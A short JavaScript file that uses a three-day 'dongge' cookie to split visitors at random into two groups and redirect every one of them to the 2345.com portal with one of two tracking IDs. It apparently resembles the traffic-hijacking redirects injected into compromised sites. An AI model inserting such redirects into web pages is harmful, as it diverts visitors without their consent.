function getCookie(name)
{
var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
if(arr=document.cookie.match(reg))
return unescape(arr[2]);
else
return null;
}
function GetRandomNum(Min,Max)
{   
var Range = Max - Min;   
var Rand = Math.random();   
return(Min + Math.round(Rand * Range));   
}
function setCookie(name,value)
{
var Days = 3;
var exp = new Date();
exp.setTime(exp.getTime() + Days*24*60*60*1000);
document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}
var ck=getCookie("dongge");
if(!ck || ck==null || ck=="")
{
	var n=GetRandomNum(1,100);
	if(n>65)
	{
		ck="a";
	}else
	{
		ck="b";
	}
	setCookie("dongge",ck);
}
if(ck=="b")
{
	location.href="https://www.2345.com/?34367";
}else if(ck=="a")
{
	location.href="https://www.2345.com/?k32605358";
}
